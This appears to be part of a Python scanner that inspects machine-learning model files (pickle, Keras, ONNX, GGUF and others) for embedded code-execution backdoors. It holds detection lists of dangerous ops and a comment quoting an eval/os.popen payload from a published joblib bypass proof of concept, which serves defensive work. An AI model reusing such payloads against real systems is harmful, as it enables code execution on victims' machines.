            for _ in range(count):
                s, offset = _read_gguf_string(data, offset)
                values.append(s)
            return values, offset
        elem_size = _GGUF_FIXED_TYPE_SIZES.get(elem_type)
        if elem_size is None:
            raise ValueError(f"unknown GGUF array element type {elem_type}")
        return None, offset + count * elem_size
    size = _GGUF_FIXED_TYPE_SIZES.get(value_type)
    if size is None:
        raise ValueError(f"unknown GGUF value type {value_type}")
    return None, offset + size


def _parse_gguf_metadata(data: bytes, max_offset: int) -> dict[str, Any]:
    """Parse the GGUF header + metadata KV section into a dict of
    string/string-array-valued keys. Raises ValueError/struct.error on a
    malformed or truncated stream -- callers should treat that as
    "can't verify structurally" rather than a positive signal either way.
    """
    if len(data) < 24 or data[:4] != GGUF_MAGIC:
        raise ValueError("not a GGUF file")
    _version, _tensor_count, kv_count = struct.unpack_from("<IQQ", data, 4)
    offset = 4 + 4 + 8 + 8
    result: dict[str, Any] = {}
    for _ in range(kv_count):
        if offset > max_offset:
            break
        key, offset = _read_gguf_string(data, offset)
        # _read_gguf_string advances by an attacker-declared length, so offset
        # can land far past the file inside a single iteration. unpack_from
        # raises OverflowError rather than struct.error once it exceeds
        # ssize_t, which is not in this function's documented failure set and
        # escaped to the caller as a crash. Re-check the bound here instead.
        if offset < 0 or offset + 4 > len(data):
            raise ValueError(f"KV entry runs past the file at offset {offset}")
        (value_type,) = struct.unpack_from("<I", data, offset)
        offset += 4
        value, offset = _read_gguf_value(data, offset, value_type)
        if value is not None:
            result[key] = value
    return result


# ── Keras model_config extraction ───────────────────────────────────
#
# Keras stores the model architecture as a literal UTF-8 JSON attribute
# value embedded in the HDF5 file. Rather than a full HDF5 parser (a new
# dependency), locate the JSON blob directly and parse it -- precise enough
# to walk the actual layer graph instead of substring-matching the raw
# binary container (which also contains tensor names and weight bytes that
# can spuriously contain words like "lambda"/"function").

_KERAS_BUILTIN_LAYER_CLASSES = frozenset({
    "Sequential", "Functional", "Model",
    "InputLayer", "Input",
    "Dense", "Activation", "Dropout", "Flatten", "Reshape", "Permute",
    "RepeatVector", "Masking", "Embedding",
    "Conv1D", "Conv2D", "Conv3D", "Conv1DTranspose", "Conv2DTranspose",
    "Conv3DTranspose", "SeparableConv1D", "SeparableConv2D",
    "DepthwiseConv2D", "Cropping1D", "Cropping2D", "Cropping3D",
    "UpSampling1D", "UpSampling2D", "UpSampling3D",
    "ZeroPadding1D", "ZeroPadding2D", "ZeroPadding3D",
    "MaxPooling1D", "MaxPooling2D", "MaxPooling3D",
    "AveragePooling1D", "AveragePooling2D", "AveragePooling3D",
    "GlobalMaxPooling1D", "GlobalMaxPooling2D", "GlobalMaxPooling3D",
    "GlobalAveragePooling1D", "GlobalAveragePooling2D", "GlobalAveragePooling3D",
    "LSTM", "GRU", "SimpleRNN", "Bidirectional", "TimeDistributed",
    "ConvLSTM1D", "ConvLSTM2D", "ConvLSTM3D",
    "BatchNormalization", "LayerNormalization", "GroupNormalization",
    "SpatialDropout1D", "SpatialDropout2D", "SpatialDropout3D",
    "GaussianNoise", "GaussianDropout", "AlphaDropout",
    "Add", "Subtract", "Multiply", "Average", "Maximum", "Minimum",
    "Concatenate", "Dot",
    "Attention", "AdditiveAttention", "MultiHeadAttention",
    "LeakyReLU", "PReLU", "ELU", "ReLU", "Softmax", "ThresholdedReLU",
    "TextVectorization", "Normalization",
    "Rescaling", "Resizing", "CenterCrop",
    # Not layers at all, but standard entries in a Keras 3 model_config's
    # optimizer/loss/metrics/initializer sections, all inert at load:
    # optimizers.
    "Adam", "AdamW", "SGD", "RMSprop", "Adagrad", "Adadelta", "Adamax",
    "Nadam", "Lion", "Lamb", "Ftrl",
    # Losses and metrics.
    "BinaryCrossentropy", "CategoricalCrossentropy",
    "SparseCategoricalCrossentropy", "MeanSquaredError", "MeanAbsoluteError",
    "MeanAbsolutePercentageError", "Huber", "KLDivergence", "CosineSimilarity",
    "FocalLoss", "Hinge", "SquaredHinge", "Poisson", "LogCosh",
    "Accuracy", "BinaryAccuracy", "CategoricalAccuracy",
    "SparseCategoricalAccuracy", "AUC", "Precision", "Recall", "F1Score",
    "PrecisionAtRecall", "RecallAtPrecision", "Mean", "Sum", "R2Score",
    "TopKCategoricalAccuracy", "SparseTopKCategoricalAccuracy",
    # Initializers and the dtype policy object.
    "GlorotUniform", "GlorotNormal", "HeNormal", "HeUniform", "LecunNormal",
    "LecunUniform", "Ones", "Zeros", "RandomNormal", "RandomUniform",
    "TruncatedNormal", "Orthogonal", "Identity", "Constant", "VarianceScaling",
    "DTypePolicy",
    # Keras 3's internal tensor marker in functional graphs.
    "__keras_tensor__",
})


def _read_file_magic(path: Path, count: int) -> bytes:
    """First `count` bytes, or b"" when the file cannot be read."""
    try:
        with open(path, "rb") as f:
            return f.read(count)
    except OSError:
        return b""


# Streaming search for the Keras architecture blob in a file too large to hold
# in memory. The window is sized just past _extract_keras_model_config's own
# 20MB balanced-brace scan limit, so a config it could parse from a full read
# is equally parseable from the window.
_KERAS_CONFIG_ANCHOR = b'"class_name"'
_KERAS_STREAM_CHUNK = 8 * 1024 * 1024
_KERAS_CONFIG_WINDOW = 24_000_000
_KERAS_CONFIG_BACKTRACK = 4096


def _read_keras_config_window(path: Path) -> bytes | None:
    """Locate the `model_config` blob in an oversized HDF5 file by streaming.

    Returns a bounded window containing the anchor, positioned far enough back
    that the caller's `rfind(b"{")` still finds the opening brace, or None when
    the anchor never appears (a weights-only file has no architecture to check).
    Peak memory is one chunk plus one window, never the file.
    """
    overlap = len(_KERAS_CONFIG_ANCHOR) - 1
    try:
        with open(path, "rb") as f:
            pos = 0          # file offset of buf[0]
            tail = b""
            while True:
                chunk = f.read(_KERAS_STREAM_CHUNK)
                if not chunk:
                    return None
                buf = tail + chunk
                idx = buf.find(_KERAS_CONFIG_ANCHOR)
                if idx != -1:
                    start = max(0, pos + idx - _KERAS_CONFIG_BACKTRACK)
                    f.seek(start)
                    return f.read(_KERAS_CONFIG_WINDOW)
                keep = min(len(buf), overlap)
                pos += len(buf) - keep
                tail = buf[len(buf) - keep:] if keep else b""
    except OSError:
        return None


def _extract_keras_model_config(data: bytes) -> dict | None:
    """Best-effort extraction of Keras's `model_config` JSON blob from a raw
    HDF5 byte stream: locate a `"class_name"`-anchored JSON object and parse
    it with a quote-aware balanced-brace scan. Returns None if no valid JSON
    model config is found (e.g. a weights-only H5 file with no architecture
    attribute -- nothing to check).
    """
    marker = b'"class_name"'
    idx = data.find(marker)
    if idx == -1:
        return None
    start = data.rfind(b"{", 0, idx)
    if start == -1:
        return None

    depth = 0
    in_string = False
    escape = False
    end = None
    scan_limit = min(len(data), start + 20_000_000)
    for i in range(start, scan_limit):
        byte = data[i:i + 1]
        if in_string:
            if escape:
                escape = False
            elif byte == b"\\":
                escape = True
            elif byte == b'"':
                in_string = False
            continue
        if byte == b'"':
            in_string = True
        elif byte == b"{":
            depth += 1
        elif byte == b"}":
            depth -= 1
            if depth == 0:
                end = i + 1
                break

    if end is None:
        return None
    try:
        parsed = json.loads(data[start:end].decode("utf-8"))
    except (json.JSONDecodeError, UnicodeDecodeError):
        return None
    return parsed if isinstance(parsed, dict) else None


def _find_keras_risky_layers(config: Any) -> list[str]:
    """Recursively walk a parsed Keras model_config, returning human-readable
    descriptions of Lambda layers / unrecognized layer classes actually
    present in the layer graph -- not a substring match. A Lambda layer's
    config embeds a marshalled/base64-encoded Python function that executes
    on load, so its presence alone (regardless of what it does) is the
    signal; an unrecognized (non-builtin) class name is weaker evidence
    (most are legitimate custom architectures) and reported separately.
    """
    risky: list[str] = []

    def walk(node: Any) -> None:
        if isinstance(node, dict):
            class_name = node.get("class_name")
            if class_name == "Lambda":
                layer_name = (node.get("config") or {}).get("name", "unnamed")
                risky.append(f"Lambda layer '{layer_name}'")
            for value in node.values():
                walk(value)
        elif isinstance(node, list):
            for item in node:
                walk(item)

    walk(config)
    # A config can hold the same layer graph more than once -- a SavedModel's
    # `keras_metadata.pb` stores it under both `config` and `model_config` --
    # and counting one Lambda layer twice overstates the finding. Layer names
    # are unique within a Keras model, so collapsing identical descriptions
    # only ever merges re-serialized copies of one layer, never two real ones.
    deduped: list[str] = []
    for item in risky:
        if item not in deduped:
            deduped.append(item)
    return deduped


def _find_keras_unrecognized_classes(config: Any) -> list[str]:
    """Same walk as _find_keras_risky_layers but collects layer class names
    not on the known-builtin list (excluding Lambda, handled separately) --
    weaker, informational-only evidence."""
    unrecognized: set[str] = set()

    def walk(node: Any) -> None:
        if isinstance(node, dict):
            class_name = node.get("class_name")
            if (
                isinstance(class_name, str)
                and class_name != "Lambda"
                and class_name not in _KERAS_BUILTIN_LAYER_CLASSES
            ):
                unrecognized.add(class_name)
            for value in node.values():
                walk(value)
        elif isinstance(node, list):
            for item in node:
                walk(item)

    walk(config)
    return sorted(unrecognized)


# SafeTensors magic
SAFETENSORS_MAGIC = b"\x00\x00\x00\x00"

# HDF5's fixed 8-byte file signature (used by both legacy Keras .h5/.hdf5
# and any other HDF5-backed format) -- shared between _scan_keras and the
# format-sniffing helper below so the two don't drift on the literal.
HDF5_SIGNATURE = b"\x89HDF\r\n\x1a\n"


# ── Minimal schema-less protobuf walker (ONNX + TF SavedModel) ──────
#
# Both formats are protobuf messages (onnx.ModelProto / tensorflow.GraphDef),
# but pulling in the `onnx`/`protobuf` packages as a hard dependency just to
# read op names and path strings out of a possibly-malicious model file is
# more surface area than this needs. Protobuf's wire format is fully
# self-describing enough to walk generically without the .proto schema: each
# field is a (field_number, wire_type) varint key followed by a
# type-appropriate value, and a "wire_type 2" (length-delimited) field is
# either a string/bytes leaf or a nested submessage -- ambiguous without the
# schema, so this walks it both ways (recurse if it parses as a submessage,
# also try it as UTF-8 text) rather than guessing.

def _read_varint(data: bytes, i: int) -> tuple[int, int]:
    result = 0
    shift = 0
    while True:
        if i >= len(data):
            raise IndexError("truncated varint")
        b = data[i]
        i += 1
        result |= (b & 0x7F) << shift
        if not (b & 0x80):
            return result, i
        shift += 7
        if shift > 70:
            raise ValueError("varint too long")


def _iter_protobuf_fields(data: bytes):
    """Yield (field_number, wire_type, value) for each top-level field.

    Tolerates truncated/malformed input by stopping early (not raising) --
    this walks attacker-controlled files, so a deliberately corrupted
    protobuf blob must degrade to "found nothing further", never a crash.
    Bails on wire types 3/4 (deprecated start/end group) rather than risk
    misinterpreting the rest of the stream.
    """
    i = 0
    n = len(data)
    while i < n:
        try:
            key, i = _read_varint(data, i)
        except (IndexError, ValueError):
            return
        wire_type = key & 0x7
        field_num = key >> 3
        if wire_type == 0:
            try:
                val, i = _read_varint(data, i)
            except (IndexError, ValueError):
                return
            yield field_num, wire_type, val
        elif wire_type == 1:
            if i + 8 > n:
                return
            yield field_num, wire_type, data[i : i + 8]
            i += 8
        elif wire_type == 2:
            try:
                length, i = _read_varint(data, i)
            except (IndexError, ValueError):
                return
            if length < 0 or i + length > n:
                return
            yield field_num, wire_type, data[i : i + length]
            i += length
        elif wire_type == 5:
            if i + 4 > n:
                return
            yield field_num, wire_type, data[i : i + 4]
            i += 4
        else:
            return


def _extract_protobuf_strings(data: bytes, max_depth: int = 12) -> list[str]:
    """Recursively collect every printable UTF-8 string found in any
    length-delimited field, at any nesting depth -- op names, custom-op
    attribute values, and external-data path references all show up as
    plain string leaves somewhere in this tree, regardless of which message
    type actually declares them (which we don't know, schema-less)."""
    strings: list[str] = []
    if max_depth <= 0:
        return strings
    for _field_num, wire_type, value in _iter_protobuf_fields(data):
        if wire_type != 2 or not isinstance(value, (bytes, bytearray)):
            continue
        sub_fields = list(_iter_protobuf_fields(value))
        if sub_fields:
            strings.extend(_extract_protobuf_strings(bytes(value), max_depth - 1))
        try:
            text = value.decode("utf-8")
        except UnicodeDecodeError:
            continue
        if text and text.isprintable():
            strings.append(text)
    return strings


# ONNX custom ops with documented code-execution behavior (onnxruntime-extensions'
# PyOp/PythonOp embeds a Python callable, by name or source, that runs at
# inference time -- this is the real, previously-exploited ONNX RCE vector,
# not a hypothetical).
ONNX_DANGEROUS_OPS: frozenset[str] = frozenset({"PyOp", "PythonOp", "Inference"})

# TensorFlow ops that read/write the filesystem or run an embedded Python
# callable at graph-execution time -- the same class of "presence is the
# signal" evidence as MFV-KERAS-001's Lambda-layer check.
#
# Deliberately NOT in this set: ShardedFilename and MergeV2Checkpoints.
# tf.train.Saver adds both to a graph's save/restore machinery, so they
# appear in the MetaGraphDef of ordinary SavedModels as checkpoint
# boilerplate and run only when the save/restore ops are explicitly
# invoked, never at inference. Their presence carries no signal.
TF_DANGEROUS_OPS: frozenset[str] = frozenset({
    "PyFunc", "PyFuncStateless", "ReadFile", "WriteFile",
})

# The only keys ONNX's TensorProto.external_data map (StringStringEntryProto)
# can legitimately carry. Before onnx 1.21.0 (CVE-2026-34445) these keys were
# passed to setattr() on the ExternalDataInfo object, so a key outside this
# set overwrote internal properties. A file carrying one is never legitimate.
_ONNX_EXTERNAL_DATA_KEYS: frozenset[str] = frozenset(
    {"location", "offset", "length", "checksum"}
)

# Absolute path shapes that escape the model's directory just as surely as a
# ".." segment: POSIX root (but not the protocol-relative "//"), UNC, and
# drive-letter paths. Checked only against external_data location values,
# never whole-file: ONNX node names are hierarchical scope paths that begin
# with "/" by convention ("/bert/Cast"), so a leading slash anywhere else is
# the naming scheme, not a path.
_ONNX_ABSOLUTE_PATH_RE = re.compile(r"^(?:/[^/]|\\\\|[A-Za-z]:[\\/])")

# Anything that is not a plain relative filename: a scheme, a UNC path,
# or a protocol-relative reference.
_ONNX_REMOTE_LOCATION_RE = re.compile(
    r"^(?:[a-zA-Z][a-zA-Z0-9+.-]*://|//|\\\\\\\\)"
)


def _string_string_entry(value: bytes) -> tuple[str, str] | None:
    """If `value` parses as a StringStringEntryProto {key: 1, value: 2} with
    exactly those two fields and both decode as UTF-8, return (key, value),
    else None. Anything richer is some other message and not ours to read."""
    key: str | None = None
    val: str | None = None
    for field_num, wire_type, field_value in _iter_protobuf_fields(value):
        if wire_type != 2 or not isinstance(field_value, (bytes, bytearray)):
            return None
        try:
            text = bytes(field_value).decode("utf-8")
        except UnicodeDecodeError:
            return None
        if field_num == 1:
            key = text
        elif field_num == 2:
            val = text
        else:
            return None
    if key is None:
        return None
    return key, val if val is not None else ""


def _onnx_external_data_maps(data: bytes, max_depth: int = 12) -> list[dict[str, str]]:
    """Collect message-shaped regions that look like a TensorProto's repeated
    external_data map. The walk is schema-less, so the anchor is the map's own
    contents: a StringStringEntry map carrying a "location" key is, in an ONNX
    file, external_data with overwhelming probability (ModelProto.metadata_props,
    the only other such map in common use, keys on author/license/converted_by,
    not "location")."""
    maps: list[dict[str, str]] = []
    if max_depth <= 0:
        return maps
    entries: dict[str, str] = {}
    for _field_num, wire_type, value in _iter_protobuf_fields(data):
        if wire_type != 2 or not isinstance(value, (bytes, bytearray)):
            continue
        entry = _string_string_entry(bytes(value))
        if entry is not None:
            entries[entry[0]] = entry[1]
        else:
            maps.extend(_onnx_external_data_maps(bytes(value), max_depth - 1))
    if "location" in entries:
        maps.append(entries)
    return maps


def _skip_unverified_finding(
    file_path: Path, detail: str, metadata: dict[str, Any] | None = None,
) -> Finding:
    """MFV-SKIP-003: the file could not be opened, read, or parsed, so its
    content was never verified. A parser error is a suspicious state, not a
    clean verdict (exception-oriented evasion, arXiv 2508.19774): real
    loaders are routinely more permissive than this scanner's parser, so a
    file that breaks the parse here can still execute downstream."""
    return Finding(
        rule_id="MFV-SKIP-003",
        message=f"{detail} Content could not be verified. NOT a clean verdict.",
        severity=Severity.LOW,
        category=Category.AI_ML,
        file_path=str(file_path),
        start_line=0,
        confidence=0.50,
        engine="mfv",
        metadata=metadata or {},
    )


class ModelFormat(str, Enum):
    PICKLE = "pickle"
    SAFETENSORS = "safetensors"
    GGUF = "gguf"
    KERAS = "keras"
    PYTORCH_ZIP = "pytorch_zip"
    ONNX = "onnx"
    TF_SAVEDMODEL = "tf_savedmodel"
    KERAS_METADATA = "keras_metadata"
    NEMO = "nemo"
    NUMPY = "numpy"
    JOBLIB = "joblib"
    SKOPS = "skops"
    TFLITE = "tflite"
    SEVENZ = "sevenz"
    PMML = "pmml"
    UNKNOWN = "unknown"


@dataclass
class ModelFileFinding:
    path: str
    format: ModelFormat
    severity: Severity
    message: str
    evidence: str = ""
    details: dict[str, Any] = field(default_factory=dict)


# Directory names never worth walking: version control, virtualenvs, build
# output, and vendored dependency trees. A model file inside site-packages
# belongs to a library, not to the project being scanned.
SKIP_DIR_NAMES = frozenset({
    ".git", ".tox", ".mypy_cache", ".pytest_cache", ".ruff_cache",
    "__pycache__", "node_modules", "venv", ".venv", "env",
    "dist", "build", ".eggs", "site-packages", "dist-packages",
    "vendor", "vendored", "third_party", "third-party",
    "bower_components", ".yarn", ".pnp", "jspm_packages",
    "bundle", "bundles",
})



# joblib.dump(compress=...) accepts zlib, gzip, bz2, lzma and xz. Sniffing
# only zlib meant an lzma-compressed pickle was handed to the pickle walker
# still compressed, found no opcodes, and passed clean. A published bypass
# proof of concept exploits exactly that: payload2_lzma_rce.joblib carries
# builtins.eval("__import__('os').popen('id').read()") behind lzma.
_COMPRESSED_STREAM_MAGIC: tuple[tuple[bytes, str], ...] = (
    (b"\x1f\x8b", "gzip"),
    (b"BZh", "bz2"),
    (b"\xfd7zXZ\x00", "xz"),
    (b"\x5d\x00\x00", "lzma"),
)


def _sniff_compression(data: bytes) -> str | None:
    """Which codec wraps this stream, if any."""
    for magic, name in _COMPRESSED_STREAM_MAGIC:
        if data.startswith(magic):
            return name
    # zlib has no constant magic: byte 0 is 0x78 for the window sizes any
    # real compressor emits, and byte 1 encodes the check bits.
    if len(data) >= 2 and data[0] == 0x78 and data[1] in (0x01, 0x5E, 0x9C, 0xDA):
        return "zlib"
    return None


def _new_decompressor(kind: str):
    if kind == "zlib":
        return zlib.decompressobj()
    if kind == "gzip":
        return zlib.decompressobj(16 + zlib.MAX_WBITS)
    if kind == "bz2":
        return bz2.BZ2Decompressor()
    if kind == "xz":
        return lzma.LZMADecompressor(format=lzma.FORMAT_XZ)
    return lzma.LZMADecompressor(format=lzma.FORMAT_ALONE)


class ModelFileScanner:
    """Scans ML model files for backdoors and unsafe content."""

    MAX_SCAN_BYTES = 500_000_000  # 500 MB; larger files are streamed or skipped
    MAX_ZIP_MEMBER_BYTES = 200_000_000  # 200 MB cap on decompressed pickle members

    # Extensions too generic to map to a format, but too commonly used by real
    # model files to skip. `.bin` is `pytorch_model.bin`, the default weight
    # filename transformers used before safetensors and still the most common
    # pickle-bearing file on HuggingFace -- and equally the extension of any
    # unrelated binary blob. `.zip` is the same problem one level up: a zip
    # holding `data.pkl` is a checkpoint whatever it is called, and shipping a
    # model as a zip is ordinary practice, but most `.zip` files are not
    # models. scan_file resolves both by content sniff rather than by name; an
    # unrecognizable one is skipped, same as any other unknown extension.
    _AMBIGUOUS_EXTENSIONS: frozenset[str] = frozenset({".bin", ".zip"})

    def __init__(self):
        self._format_map: dict[str, ModelFormat] = {
            ".pkl": ModelFormat.PICKLE,
            ".pickle": ModelFormat.PICKLE,
            ".pth": ModelFormat.PICKLE,
            ".pt": ModelFormat.PICKLE,
            ".ckpt": ModelFormat.PICKLE,
            # `.th` is a torch checkpoint suffix in real use (OpenCLIP and
            # several eval harnesses write `*_stats.th`), and torch.load reads
            # it like any other checkpoint -- zip-wrapped or flat pickle. Both
            # paths are already handled below; only the extension was missing.
            ".th": ModelFormat.PICKLE,
            # TorchServe model archive: a zip holding the serialized model
            # plus the handler source. `torch-model-archiver` is the standard
            # way a PyTorch model reaches a serving host, and TorchServe
            # unpickles the payload on load, so the archive is exactly as
            # dangerous as the checkpoint inside it.
            ".mar": ModelFormat.PICKLE,
            # NVIDIA NeMo checkpoint: a tar archive whose `model_weights.ckpt`
            # is an ordinary pickle. NeMo pins `weights_only=False` on load to
            # stay compatible with its own config objects, so PyTorch 2.6's
            # safe-load default does not protect it.
            ".nemo": ModelFormat.NEMO,
            ".safetensors": ModelFormat.SAFETENSORS,
            ".gguf": ModelFormat.GGUF,
            ".h5": ModelFormat.KERAS,
            ".hdf5": ModelFormat.KERAS,
            ".keras": ModelFormat.KERAS,
            ".onnx": ModelFormat.ONNX,
            # TensorFlow SavedModel is a directory (saved_model.pb + variables/),
            # not a self-contained file -- the .pb extension is also used by
            # arbitrary other protobufs, so scan_file further requires the
            # canonical filename before treating a .pb as a SavedModel graph.
            ".pb": ModelFormat.TF_SAVEDMODEL,
            ".npy": ModelFormat.NUMPY,
            ".npz": ModelFormat.NUMPY,
            ".joblib": ModelFormat.JOBLIB,
            # 7z archives: py7zr (the only Python reader) is LGPL-2.1, which
            # the closed-source direction cannot absorb, and no model
            # framework saves 7z, so extraction is opportunistic via a system
            # 7zz binary and the archive is always reported as unverifiable
            # without one rather than silently skipped.
            ".7z": ModelFormat.SEVENZ,
            # TFLite executes no code on load, but its parsers compute
            # tensor sizes from attacker-chosen dimensions, and
            # CVE-2026-42627 (ArmNN, 2026-05) is exactly that overflow.
            ".tflite": ModelFormat.TFLITE,
            # skops.io's pickle-free sklearn format: a zip of schema.json +
            # .npy members. Its security contract is structural (a closed
            # loader set and two loader invariants), so it is checked as
            # structure rather than by name list.
            ".skops": ModelFormat.SKOPS,
            # PMML is XML and its threat model is XXE (file-read, SSRF)
            # plus embedded code-exec constructs in transformations,
            # neither of which need the op-registration the earlier
            # "data-only" rejection assumed.
            ".pmml": ModelFormat.PMML,
        }


    def scan_file(self, file_path: Path) -> list[Finding]:
        """Scan a single model file."""
        ext = file_path.suffix.lower()
        fmt = self._format_map.get(ext, ModelFormat.UNKNOWN)

        if fmt == ModelFormat.UNKNOWN and ext not in self._AMBIGUOUS_EXTENSIONS:
            return []

        if fmt == ModelFormat.TF_SAVEDMODEL:
            # .pb is also used by arbitrary other protobufs (TF frozen graphs,
            # unrelated proto blobs), so only the two canonical filenames a
            # SavedModel export writes are treated as scannable.
            #
            # `keras_metadata.pb` is not a graph: it is a SavedMetadata
            # protobuf whose node metadata carries the Keras `model_config`
            # JSON, i.e. the same layer graph the legacy `.h5` path already
            # parses. That is where a Lambda layer's marshalled Python
            # function is actually stored -- verified on four MalHug repos
            # (m0kr4n3/model3, mastersplinter/infected_test,
            # mkiani/unsafe-saved-model, opendiffusion/sentimentcheck): the
            # base64 code object is present in `keras_metadata.pb` and absent
            # from the sibling `saved_model.pb` in every one of them.
            name = file_path.name
            if name == "keras_metadata.pb":
                fmt = ModelFormat.KERAS_METADATA
            elif name != "saved_model.pb":
                return []

        if fmt == ModelFormat.NEMO:
            # Checked before the size gate below: that cap exists to bound
            # `read_bytes()`, and tarfile reads member by member straight off
            # disk without ever materialising the whole archive. Real .nemo
            # checkpoints run to hundreds of megabytes, so gating them on
            # total file size would skip the common case.
            return self._scan_tar_pickles(file_path)

        if fmt == ModelFormat.SKOPS:
            # Same reasoning as NEMO: zipfile reads members lazily, so the
            # whole-file cap below would only skip large ensembles for no
            # memory it would ever have spent.
            return self._scan_skops(file_path)

        if fmt == ModelFormat.SEVENZ:
            return self._scan_7z(file_path)

        try:
            file_size = file_path.stat().st_size
        except OSError:
            return [_skip_unverified_finding(
                file_path,
                "The file's size could not be determined, so it was never scanned.",
                metadata={"skipped_reason": "unreadable"},
            )]

        if file_size > self.MAX_SCAN_BYTES:
            # The cap exists because `read_bytes()` below would pull the whole
            # file into memory. That cost is real for a flat file, but a ZIP
            # container does not require it: `zipfile` reads lazily off disk
            # and only the pickle member is ever decompressed, already bounded
            # by MAX_ZIP_MEMBER_BYTES.
            #
            # Gating on file size rather than on parse size was a trivially
            # exploitable evasion: pad a checkpoint past the limit and the
            # scanner stops looking. Measured on MalHug, a corpus of real
            # in-the-wild malicious HuggingFace models, this accounted for
            # **every one** of this scanner's true blind spots. The clearest case is
            # `MustEr/rager_legacy`, 522MB on disk whose `archive/data.pkl` is
            # 20,203 bytes: a 20KB parse was being skipped to avoid a cost
            # that a ZIP container never charges. The classifier here calls
            # those payloads denied once it actually reads them
            # (`runpy._run_code`, `__builtin__.eval`, `__builtin__.exec`).
            if zipfile.is_zipfile(file_path):
                return self._scan_pytorch_zip(file_path)

            # Same argument for HDF5. A Keras .h5 keeps its architecture in a
            # `model_config` attribute of a few kilobytes; the rest is weights.
            # Two MalHug models, MustEr/vgg_official and vgg16_light, are 553MB
            # files carrying a real malicious Lambda layer, and both were being
            # skipped here to avoid a cost that only the weights impose. The
            # anchor is located by streaming and only a bounded window around
            # it is ever held in memory.
            if _read_file_magic(file_path, len(HDF5_SIGNATURE)) == HDF5_SIGNATURE:
                window = _read_keras_config_window(file_path)
                config = _extract_keras_model_config(window) if window else None
                if config is not None:
                    return self._keras_findings_from_config(file_path, config)

            return [Finding(
                rule_id="MFV-SKIP-001",
                message=f"Model file exceeds {self.MAX_SCAN_BYTES // 1_000_000}MB scan limit "
                        f"({file_size // 1_000_000}MB) and is not a ZIP container, so it cannot "
                        f"be scanned without reading it entirely into memory. NOT a clean "
                        f"verdict: the file was never analysed.",
                severity=Severity.LOW,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.50,
                engine="mfv",
                metadata={"file_size": file_size, "skipped_reason": "oversized"},
            )]

        try:
            data = file_path.read_bytes()
        except OSError:
            return [_skip_unverified_finding(
                file_path,
                "The file could not be read, so it was never scanned.",
                metadata={"skipped_reason": "unreadable"},
            )]

        if ext in self._AMBIGUOUS_EXTENSIONS:
            # `.bin` names the single most common PyTorch weight file on
            # HuggingFace (`pytorch_model.bin`), but it is also used for
            # arbitrary unrelated binaries, so it can't simply be mapped to
            # PICKLE -- that would run the pickle parser over every stray blob
            # and report parse failures as findings. Let the content decide,
            # the same way torch.load itself does. Anything `_sniff_format`
            # can't positively identify is skipped, exactly as before.
            fmt = self._sniff_format(data) or ModelFormat.UNKNOWN
            if fmt == ModelFormat.UNKNOWN:
                return []

        # `.pth` is an overloaded extension: besides a PyTorch checkpoint it is
        # also Python's own path-configuration file, a plain-text list of
        # directories (plus optional `import ...` lines) that setuptools,
        # virtualenv, and editable installs drop into site-packages. Those are
        # not pickles, so opcode analysis raises and MFV-PICKLE-002's raw-byte
        # fallback matches the `import`/`__import__` text in them -- a pure
        # false positive at HIGH severity. Measured across scan-targets/: 9 of
        # 9 `.pth` files were path-configuration files and none was a
        # checkpoint. Require the real thing's magic bytes: torch.save()
        # produces either a ZIP (default since PyTorch 1.6) or a protocol-2+
        # pickle, which always opens with the PROTO opcode `\x80`. Same
        # reasoning as the `saved_model.pb` guard above -- an extension that
        # other tooling also uses is not on its own evidence of the format.
        if file_path.suffix.lower() == ".pth" and not (
            data[:1] == b"\x80" or data[:4] == b"PK\x03\x04"
        ):
            return []

        # Modern PyTorch checkpoints (.pt/.pth/.ckpt) are ZIP archives that
        # wrap the real pickle (archive/data.pkl). torch.save() has produced
        # these by default since PyTorch 1.6. Scan inside the archive; fall
        # back to flat-pickle scanning for the legacy non-zip format. This is
        # tracked separately from `fmt` because a zip-wrapped checkpoint
        # already gets its own (member-level) parse-failure handling inside
        # _scan_pytorch_zip -- the extension-confusion check below only
        # applies to the flat-pickle path.
        is_zip_pickle = fmt == ModelFormat.PICKLE and zipfile.is_zipfile(file_path)

        findings = self._run_scanner_for_format(fmt, file_path, data, is_zip_pickle=is_zip_pickle)

        # Extension-spoofing check (issue #152): a format-specific parse
        # failure alone doesn't distinguish "corrupted file" from "wrong
        # extension entirely" -- a raw pickle saved as .safetensors fails
        # SafeTensors' JSON-header parse and gets reported as merely
        # "corrupted", but several real loaders (torch.load, safetensors
        # readers, GGUF loaders) sniff magic bytes rather than trusting the
        # extension, so that file still executes when actually loaded
        # downstream. Only fires when the extension-directed scan hit an
        # identifiable structural-parse-failure signal AND the raw bytes
        # match a *different* known format -- never invents a mismatch on a
        # file that's simply corrupted (see _sniff_format/_extension_parse_failed).
        if not is_zip_pickle and self._extension_parse_failed(fmt, file_path, data, findings):
            sniffed = self._sniff_format(data)
            if sniffed is not None and sniffed != fmt:
                findings = list(findings)
                findings.append(self._confuse_finding(file_path, fmt, sniffed))
                findings.extend(self._run_scanner_for_format(sniffed, file_path, data))

        exec_hits = _find_embedded_executables(data)
        if exec_hits:
            findings.append(self._executable_finding(file_path, exec_hits))

        return findings

    def _executable_finding(
        self, file_path: Path, hits: list[str], member: str | None = None,
    ) -> Finding:
        label = f"[{member}] " if member else ""
        return Finding(
            rule_id="MFV-EXEC-001",
            message=f"{label}Model file contains a loadable binary: "
                    f"{'; '.join(hits[:3])}. No serialization format writes "
                    f"one; this is a payload appended to or embedded in the "
                    f"file (polyglot/steganography), not model data.",
            severity=Severity.HIGH,
            category=Category.AI_ML,
            file_path=str(file_path),
            start_line=0,
            confidence=0.8,
            cwe_ids=[506],
            engine="mfv",
            metadata={"embedded": hits[:10], **({"zip_member": member} if member else {})},
        )

    def _run_scanner_for_format(
        self, fmt: ModelFormat, file_path: Path, data: bytes, is_zip_pickle: bool = False,
    ) -> list[Finding]:
        """Dispatch to the format-specific `_scan_*` method for `fmt`.

        Shared between the normal extension-directed dispatch in `scan_file`
        and the sniffed-format re-scan triggered by a detected extension
        mismatch, so the two paths can't drift on how each format is invoked.
        """
        if fmt == ModelFormat.PICKLE:
            # `is_zip_pickle` is only ever True when this is the primary
            # extension-directed dispatch for a .pt/.pth/.pkl/... file that
            # zipfile.is_zipfile() already confirmed is a real zip; the
            # sniffed-format re-scan path (is_zip_pickle defaults False)
            # always means "matched via the flat pickle-opcode fallback in
            # _sniff_format", so it always goes to _scan_pickle directly.
            if is_zip_pickle:
                return self._scan_pytorch_zip(file_path)
            return self._scan_pickle(file_path, data)
        elif fmt == ModelFormat.SAFETENSORS:
            return self._scan_safetensors(file_path, data)
        elif fmt == ModelFormat.GGUF:
            return self._scan_gguf(file_path, data)
